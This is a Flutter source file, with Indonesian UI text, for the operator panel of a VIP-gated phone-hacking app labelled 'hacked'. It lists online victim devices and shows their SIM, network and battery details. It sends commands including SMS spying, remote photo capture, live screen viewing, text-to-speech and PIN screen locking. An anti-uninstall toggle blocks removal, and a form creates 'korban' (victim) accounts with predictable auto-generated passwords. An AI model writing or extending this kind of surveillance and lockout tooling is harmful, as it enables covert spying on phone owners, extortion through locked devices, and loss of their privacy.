                decoration: BoxDecoration(color: const Color(0xFF06B6D4).withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: const Color(0xFF06B6D4).withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.4))),
                  child: const Center(child: Icon(Icons.record_voice_over_rounded, color: Color(0xFF06B6D4), size: 18))),
                const SizedBox(width: 12),
                const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text('TEXT TO SPEECH', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Device akan berbicara keras', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF06B6D4))),
                ]),
              ]),
              const SizedBox(height: 20),
              const Text('BAHASA', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF06B6D4), letterSpacing: 1.5)),
              const SizedBox(height: 8),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => setS(() => selectedLang = 'id'),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: selectedLang == 'id' ? const Color(0xFF06B6D4).withOpacity(0.2) : const Color(0xFF071525),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: selectedLang == 'id' ? const Color(0xFF06B6D4) : const Color(0xFF06B6D4).withOpacity(0.2))),
                    child: const Center(child: Text('🇮🇩 Indonesia', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)))))),
                const SizedBox(width: 10),
                Expanded(child: GestureDetector(
                  onTap: () => setS(() => selectedLang = 'en'),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: selectedLang == 'en' ? const Color(0xFF06B6D4).withOpacity(0.2) : const Color(0xFF071525),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: selectedLang == 'en' ? const Color(0xFF06B6D4) : const Color(0xFF06B6D4).withOpacity(0.2))),
                    child: const Center(child: Text('🇬🇧 English', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)))))),
              ]),
              const SizedBox(height: 16),
              const Text('TEKS YANG AKAN DIBACAKAN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF06B6D4), letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.3))),
                child: TextField(
                  controller: textCtrl, maxLines: 3,
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                  decoration: InputDecoration(border: InputBorder.none, contentPadding: const EdgeInsets.all(14),
                    hintText: 'Masukkan teks yang akan diucapkan device...',
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 11, fontFamily: 'ShareTechMono')),
                ),
              ),
              const SizedBox(height: 16),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => Navigator.pop(ctx),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                    child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
                const SizedBox(width: 12),
                Expanded(child: GestureDetector(
                  onTap: () {
                    final text = textCtrl.text.trim();
                    if (text.isEmpty) { _snack('Teks tidak boleh kosong', isError: true); return; }
                    Navigator.pop(ctx);
                    _sendCommand('tts', {'text': text, 'lang': selectedLang});
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [Color(0xFF06B6D4), Color(0xFF0891B2)]), borderRadius: BorderRadius.circular(12)),
                    child: const Center(child: Text('BICARAKAN!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
              ]),
            ]),
          ),
        ),
      ),
    );
  }

  void _showSoundDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _SoundSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSent: (msg) => _snack(msg),
        onError: (msg) => _snack(msg, isError: true),
      ),
    );
  }

  void _showComingSoon(String title) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _purple.withOpacity(0.5))),
        title: Row(children: [
          Container(width: 3, height: 18, decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(2))),
          const SizedBox(width: 10),
          Flexible(child: Text(title.toUpperCase(), style: const TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 13, letterSpacing: 1.5))),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(color: _purple.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.3))),
            child: Column(children: [
              SvgPicture.string(AppSvgIcons.zap, width: 36, height: 36, colorFilter: ColorFilter.mode(Colors.orange.withOpacity(0.8), BlendMode.srcIn)),
              const SizedBox(height: 12),
              Text(tr('coming_soon'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: Colors.orange, letterSpacing: 2, fontWeight: FontWeight.bold)),
              const SizedBox(height: 8),
              Text(tr('coming_soon_body'), textAlign: TextAlign.center, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: AppTheme.textMuted, height: 1.6)),
            ])),
        ]),
        actions: [
          Container(
            decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(8)),
            child: TextButton(onPressed: () => Navigator.pop(context),
              child: const Text('Ok', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 11, letterSpacing: 1)))),
        ],
      ),
    );
  }

  void _showLockDialog() {
    _lockTextCtrl.clear();
    _pinCtrl.clear();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setSheetState) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: _purple.withOpacity(0.3))),
            padding: const EdgeInsets.all(24),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _purple.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.4))),
                  child: Center(child: SvgPicture.string(AppSvgIcons.lock, width: 18, height: 18, colorFilter: const ColorFilter.mode(_purple, BlendMode.srcIn)))),
                const SizedBox(width: 12),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text(tr('lock_device'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text(tr('lock_text_hint'), style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: AppTheme.textMuted.withOpacity(0.7))),
                ]),
              ]),
              const SizedBox(height: 20),
              Text('PESAN LOCK SCREEN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.3))),
                child: TextField(
                  controller: _lockTextCtrl, maxLines: 3,
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                  decoration: InputDecoration(border: InputBorder.none, contentPadding: const EdgeInsets.all(14),
                    hintText: 'Masukkan pesan yang akan ditampilkan di lock screen...',
                    hintStyle: TextStyle(color: AppTheme.textMuted.withOpacity(0.4), fontSize: 11, fontFamily: 'ShareTechMono')),
                ),
              ),
              const SizedBox(height: 16),
              Text('PIN UNLOCK (4-8 DIGIT)', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.3))),
                child: TextField(
                  controller: _pinCtrl, keyboardType: TextInputType.number, maxLength: 8, textAlign: TextAlign.center,
                  style: const TextStyle(fontFamily: 'Orbitron', color: _purple, fontSize: 24, letterSpacing: 12, fontWeight: FontWeight.bold),
                  decoration: InputDecoration(border: InputBorder.none, counterText: '',
                    contentPadding: const EdgeInsets.symmetric(vertical: 16), hintText: '••••',
                    hintStyle: TextStyle(color: _purple.withOpacity(0.3), fontSize: 24, letterSpacing: 12, fontFamily: 'Orbitron')),
                ),
              ),
              const SizedBox(height: 20),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => Navigator.pop(ctx),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                    child: Center(child: Text(tr('cancel'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
                const SizedBox(width: 12),
                Expanded(child: GestureDetector(
                  onTap: () async {
                    final txt = _lockTextCtrl.text.trim();
                    final pin = _pinCtrl.text.trim();
                    if (pin.isEmpty) { _snack('PIN Wajib Diisi', isError: true); return; }
                    Navigator.pop(ctx);
                    await _sendCommand('lock', {'text': txt, 'pin': pin});
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(12)),
                    child: Center(child: Text(tr('lock_btn'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
              ]),
              const SizedBox(height: 8),
            ]),
          ),
        ),
      ),
    );
  }

  void _snack(String msg, {bool isError = false}) {
    if (!mounted) return;
    if (isError) {
      showError(context, msg);
    } else {
      showInfo(context, msg);
    }
  }

  @override
  Widget build(BuildContext context) {
    final allowed = _role == 'vip' || _role == 'owner' || _role == 'premium';
    return ListenableBuilder(
      listenable: AppLocalizations.instance,
      builder: (context, _) => Scaffold(
        backgroundColor: AppTheme.darkBg,
        appBar: AppBar(
          backgroundColor: AppTheme.darkBg,
          elevation: 0,
          leading: GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(margin: const EdgeInsets.all(8),
              decoration: BoxDecoration(border: Border.all(color: _purple.withOpacity(0.4)), borderRadius: BorderRadius.circular(10)),
              child: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white, size: 16))),
          title: Row(children: [
            Container(width: 3, height: 18,
              decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(2))),
            const SizedBox(width: 10),
            Text(tr('hacked_title'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 2)),
            const SizedBox(width: 8),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
              decoration: BoxDecoration(color: _gold.withOpacity(0.15), borderRadius: BorderRadius.circular(4), border: Border.all(color: _gold.withOpacity(0.5))),
              child: const Text('VIP', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: _gold, letterSpacing: 1))),
          ]),
          bottom: allowed ? TabBar(
            controller: _tabController,
            indicatorColor: _purple,
            indicatorWeight: 2.5,
            labelStyle: const TextStyle(fontFamily: 'Orbitron', fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1.5),
            unselectedLabelStyle: const TextStyle(fontFamily: 'Orbitron', fontSize: 10, letterSpacing: 1.5),
            labelColor: _purple,
            unselectedLabelColor: AppTheme.textMuted,
            dividerColor: _purple.withOpacity(0.2),
            tabs: [
              Tab(text: tr('tab_device_connect')),
              Tab(text: tr('tab_hack_command')),
              const Tab(text: 'USERS'),
            ],
          ) : PreferredSize(
            preferredSize: const Size.fromHeight(1),
            child: Container(height: 1, color: _purple.withOpacity(0.25))),
        ),
        body: !allowed
            ? _buildNoAccess()
            : TabBarView(
                controller: _tabController,
                children: [
                  _buildDeviceConnectTab(),
                  _buildHackCommandTab(),
                  _buildPsknmrcTab(),
                ],
              ),
      ),
    );
  }

  // ─── TAB 1: DEVICE CONNECT ───────────────────────────────────────────────
  Widget _buildDeviceConnectTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _buildSectionLabel(tr('select_device')),
        const SizedBox(height: 12),
        _buildDeviceSelector(),
        if (_selectedDeviceId != null) ...[
          const SizedBox(height: 20),
          _buildDeviceInfoPanel(),
        ],
        const SizedBox(height: 60),
      ]),
    );
  }

  Widget _buildDeviceInfoPanel() {
    final info = _deviceInfo;
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      _buildSectionLabel('DEVICE INFO'),
      const SizedBox(height: 12),

      // Info card
      Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: AppTheme.cardBg,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _purple.withOpacity(0.2))),
        child: _loadingDeviceInfo
          ? const Center(child: SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: _purple, strokeWidth: 2)))
          : Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              // Nama HP
              _infoRow(Icons.phone_android_rounded, 'Device', info?['model'] as String? ?? _selectedDeviceName ?? '-'),
              const SizedBox(height: 10),
              // Baterai
              _infoRow(Icons.battery_std_rounded, 'Baterai', info != null ? '${info['battery'] ?? '-'}%' : '-',
                color: (info?['battery'] as int? ?? 100) < 20 ? Colors.red : _green),
              const SizedBox(height: 10),
              // Network
              _infoRow(Icons.signal_cellular_alt_rounded, 'Network', info?['network'] as String? ?? '-'),
              const SizedBox(height: 10),
              // SIM 1
              _infoRow(Icons.sim_card_rounded, 'SIM 1', info?['sim1'] as String? ?? '-'),
              const SizedBox(height: 10),
              // SIM 2
              _infoRow(Icons.sim_card_outlined, 'SIM 2', info?['sim2'] as String? ?? 'Tidak ada'),
              const SizedBox(height: 10),
              // Android version
              _infoRow(Icons.android_rounded, 'Android', info?['androidVersion'] as String? ?? '-', color: const Color(0xFF78C257)),
            ]),
      ),

      const SizedBox(height: 16),
      _buildSectionLabel('PROTECTION'),
      const SizedBox(height: 12),

      Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: _antiUninstallActive ? _red.withOpacity(0.08) : AppTheme.cardBg,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _antiUninstallActive ? _red.withOpacity(0.4) : _purple.withOpacity(0.2))),
        child: Row(children: [
          Container(width: 40, height: 40,
            decoration: BoxDecoration(
              color: _antiUninstallActive ? _red.withOpacity(0.2) : _purple.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _antiUninstallActive ? _red.withOpacity(0.5) : _purple.withOpacity(0.3))),
            child: Icon(Icons.shield_rounded, color: _antiUninstallActive ? _red : _purple.withOpacity(0.5), size: 20)),
          const SizedBox(width: 14),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            const Text('ANTI UNINSTALL', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
            const SizedBox(height: 3),
            Text(_antiUninstallActive ? 'App terlindungi dari uninstall' : 'Aktifkan untuk proteksi penuh',
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white.withOpacity(0.4))),
          ])),
          _togglingProtection
            ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: _red, strokeWidth: 2))
            : Transform.scale(
                scale: 0.85,
                child: Switch(
                  value: _antiUninstallActive,
                  onChanged: _toggleAntiUninstall,
                  activeColor: _red,
                  activeTrackColor: _red.withOpacity(0.25),
                  inactiveThumbColor: Colors.white.withOpacity(0.3),
                  inactiveTrackColor: Colors.white.withOpacity(0.08))),
        ]),
      ),
    ]);
  }

  Widget _infoRow(IconData icon, String label, String value, {Color? color}) {
    return Row(children: [
      Icon(icon, color: color ?? _purple.withOpacity(0.6), size: 16),
      const SizedBox(width: 10),
      Text('$label:', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.4))),
      const SizedBox(width: 8),
      Expanded(child: Text(value, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: color ?? Colors.white, fontWeight: FontWeight.bold), overflow: TextOverflow.ellipsis)),
    ]);
  }

  Widget _buildHackCommandTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _buildSectionLabel(tr('hacked_commands')),
        const SizedBox(height: 4),
        if (_selectedDeviceId == null)
          Padding(
            padding: const EdgeInsets.only(bottom: 8, left: 11),
            child: Text(tr('select_device_first'),
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: AppTheme.textMuted.withOpacity(0.6)))),
        const SizedBox(height: 12),
        _buildCommandGrid(),
        const SizedBox(height: 60),
      ]),
    );
  }

  Widget _buildNoAccess() {
    return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      SvgPicture.string(AppSvgIcons.lock, width: 56, height: 56, colorFilter: ColorFilter.mode(Colors.red.withOpacity(0.4), BlendMode.srcIn)),
      const SizedBox(height: 16),
      Text(tr('no_access'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 16, color: Colors.red, letterSpacing: 3)),
      const SizedBox(height: 8),
      Text(tr('vip_only'), textAlign: TextAlign.center, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: AppTheme.textMuted, height: 1.6)),
    ]));
  }

  Widget _buildSectionLabel(String t) {
    return Row(children: [
      Container(width: 3, height: 14,
        decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(2))),
      const SizedBox(width: 8),
      Text(t, style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: _purple, letterSpacing: 2)),
    ]);
  }

  Widget _buildDeviceSelector() {
    final onlineDevices = _devices.where((d) => d['online'] == true).toList();
    if (onlineDevices.isEmpty) {
      return Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(14), border: Border.all(color: _purple.withOpacity(0.2))),
        child: Column(children: [
          SvgPicture.string(AppSvgIcons.mobile, width: 32, height: 32, colorFilter: ColorFilter.mode(_purple.withOpacity(0.3), BlendMode.srcIn)),
          const SizedBox(height: 12),
          Text(tr('no_device_online'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: AppTheme.textMuted, letterSpacing: 1)),
          const SizedBox(height: 4),
          Text(tr('device_hint'), textAlign: TextAlign.center, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: AppTheme.textMuted, height: 1.5)),
          const SizedBox(height: 12),
          GestureDetector(
            onTap: _loadDevices,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              decoration: BoxDecoration(border: Border.all(color: _purple.withOpacity(0.4)), borderRadius: BorderRadius.circular(8)),
              child: const Text('Refresh', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: _purple, letterSpacing: 1)))),
        ]),
      );
    }

    return Column(children: onlineDevices.map((d) {
      final isSelected = _selectedDeviceId == d['deviceId'];
      return GestureDetector(
        onTap: () {
          setState(() {
            _selectedDeviceId   = d['deviceId']   as String;
            _selectedDeviceName = d['deviceName'] as String;
            _flashOn = false;
            _deviceInfo = null;
          });
          _loadDeviceInfo(_selectedDeviceId!);
          // Load SMS spy state
          ApiService.get('/api/hacked/sms-spy-state/${d['deviceId']}').then((res) {
            if (mounted && res['success'] == true) {
              setState(() => _smsSpyActive = res['active'] == true);
            }
          }).catchError((_) {});
        },
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          margin: const EdgeInsets.only(bottom: 10),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: isSelected ? _purple.withOpacity(0.15) : AppTheme.cardBg,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: isSelected ? _purple : _purple.withOpacity(0.2), width: isSelected ? 1.5 : 1),
            boxShadow: isSelected ? [BoxShadow(color: _purple.withOpacity(0.25), blurRadius: 12)] : []),
          child: Row(children: [
            Container(width: 40, height: 40,
              decoration: BoxDecoration(
                color: isSelected ? _purple.withOpacity(0.3) : _purple.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _purple.withOpacity(0.4))),
              child: Center(child: SvgPicture.string(AppSvgIcons.mobile, width: 20, height: 20,
                colorFilter: ColorFilter.mode(isSelected ? _purple : _purple.withOpacity(0.5), BlendMode.srcIn)))),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(d['deviceName'] as String? ?? 'Unknown',
                style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold)),
              const SizedBox(height: 3),
              Row(children: [
                Container(width: 6, height: 6, decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.green, boxShadow: [BoxShadow(color: Colors.green, blurRadius: 4)])),
                const SizedBox(width: 6),
                const Text('Online', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.green, letterSpacing: 1)),
              ]),
            ])),
            if (isSelected) const Icon(Icons.check_circle_rounded, color: _purple, size: 20),
          ]),
        ),
      );
    }).toList());
  }

  Widget _buildCommandGrid() {
    final cmds = _hackedCommands;
    return GridView.builder(
      physics: const NeverScrollableScrollPhysics(),
      shrinkWrap: true,
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2, childAspectRatio: 1.05,
        crossAxisSpacing: 14, mainAxisSpacing: 14),
      itemCount: cmds.length,
      itemBuilder: (ctx, i) => _buildCommandCard(cmds[i]),
    );
  }

  Widget _buildCommandCard(Map<String, dynamic> cmd) {
    final color    = cmd['color']  as Color;
    final isActive = cmd['active'] as bool;
    final type     = cmd['cmd']    as String;
    final isFlash  = type == 'flashlight';
    final isPhoto  = type == 'take_photo';
    final isLive   = type == 'screen_live';
    final isSms    = type == 'sms';

    return GestureDetector(
      onTap: _sendingCmd ? null : () => _handleCommandTap(cmd),
      child: Container(
        decoration: BoxDecoration(
          gradient: AppTheme.cardGradient,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: isActive ? color.withOpacity(0.5) : color.withOpacity(0.2)),
          boxShadow: [BoxShadow(color: isActive ? color.withOpacity(0.15) : Colors.transparent, blurRadius: 10)]),
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Container(width: 40, height: 40,
              decoration: BoxDecoration(
                color: isActive ? color.withOpacity(0.2) : color.withOpacity(0.08),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: isActive ? color.withOpacity(0.5) : color.withOpacity(0.2))),
              child: Center(child: SvgPicture.string(cmd['icon'] as String, width: 20, height: 20,
                colorFilter: ColorFilter.mode(isActive ? color : color.withOpacity(0.3), BlendMode.srcIn)))),
            if (!isActive)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(color: Colors.orange.withOpacity(0.15), borderRadius: BorderRadius.circular(4), border: Border.all(color: Colors.orange.withOpacity(0.4))),
                child: const Text('Soon', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.orange, letterSpacing: 1)))
            else if (isFlash)
              Container(
                width: 40, height: 22,
                decoration: BoxDecoration(
                  color: _flashOn ? color.withOpacity(0.25) : Colors.grey.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(11),
                  border: Border.all(color: _flashOn ? color : Colors.grey.withOpacity(0.3))),
                child: Center(child: Text(_flashOn ? 'On' : 'Off',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, fontWeight: FontWeight.bold, color: _flashOn ? color : Colors.grey))))
            else if (isPhoto && _fetchingPhoto)
              SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: color, strokeWidth: 2))
            else if (isLive && _screenLiveActive)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(color: color.withOpacity(0.2), borderRadius: BorderRadius.circular(4), border: Border.all(color: color.withOpacity(0.6))),
                child: Text('LIVE', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: color, fontWeight: FontWeight.bold, letterSpacing: 1)))
            else if (isSms && _smsSpyActive)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(color: color.withOpacity(0.2), borderRadius: BorderRadius.circular(4), border: Border.all(color: color.withOpacity(0.6))),
                child: Text('ON', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: color, fontWeight: FontWeight.bold, letterSpacing: 1)))
            else
              const SizedBox.shrink(),
          ]),
          const Spacer(),
          Text(cmd['title'] as String,
            style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold,
              color: isActive ? Colors.white : Colors.white.withOpacity(0.35), letterSpacing: 0.5)),
        ]),
      ),
    );
  }

  // ─── TAB 3: PSKNMRC ──────────────────────────────────────────────────────
  Widget _buildPsknmrcTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        const Text('USERNAME', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple, letterSpacing: 1.5)),
        const SizedBox(height: 8),
        Container(
          decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.3))),
          child: TextField(
            controller: _psknmrcUsernameCtrl,
            style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 14),
            decoration: InputDecoration(
              border: InputBorder.none,
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              hintText: 'Masukkan username untuk korban...',
              hintStyle: TextStyle(color: AppTheme.textMuted.withOpacity(0.4), fontSize: 11, fontFamily: 'ShareTechMono')),
          ),
        ),
        const SizedBox(height: 16),
        if (_psknmrcMsg.isNotEmpty)
          Container(
            margin: const EdgeInsets.only(bottom: 14),
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
            decoration: BoxDecoration(
              color: _psknmrcMsg.startsWith('✓') ? Colors.green.withOpacity(0.1) : Colors.red.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _psknmrcMsg.startsWith('✓') ? Colors.green.withOpacity(0.3) : Colors.red.withOpacity(0.3))),
            child: Text(_psknmrcMsg, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: _psknmrcMsg.startsWith('✓') ? Colors.green : Colors.red)),
          ),
        SizedBox(
          width: double.infinity,
          child: GestureDetector(
            onTap: _creatingPsknmrc ? null : _createPsknmrcUser,
            child: Container(
              padding: const EdgeInsets.symmetric(vertical: 16),
              decoration: BoxDecoration(
                gradient: _creatingPsknmrc
                  ? LinearGradient(colors: [_purple.withOpacity(0.4), const Color(0xFF6D28D9).withOpacity(0.4)])
                  : const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]),
                borderRadius: BorderRadius.circular(14)),
              child: Center(child: _creatingPsknmrc
                ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                : const Text('BUAT USERNAME', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1.5))),
            ),
          ),
        ),
        const SizedBox(height: 60),
      ]),
    );
  }

  Future<void> _createPsknmrcUser() async {
    final username = _psknmrcUsernameCtrl.text.trim();
    if (username.isEmpty) { setState(() => _psknmrcMsg = 'Username tidak boleh kosong'); return; }
    setState(() { _creatingPsknmrc = true; _psknmrcMsg = ''; });
    try {
      final res = await ApiService.post('/api/create/psknmrc', {'username': username, 'password': 'psknmrc_${username}_auto'});
      if (res['success'] == true) {
        setState(() { _psknmrcMsg = '✓ Akun korban "$username" berhasil dibuat!'; _psknmrcUsernameCtrl.clear(); });
      } else {
        setState(() => _psknmrcMsg = res['message'] as String? ?? 'Gagal membuat akun');
      }
    } catch (e) {
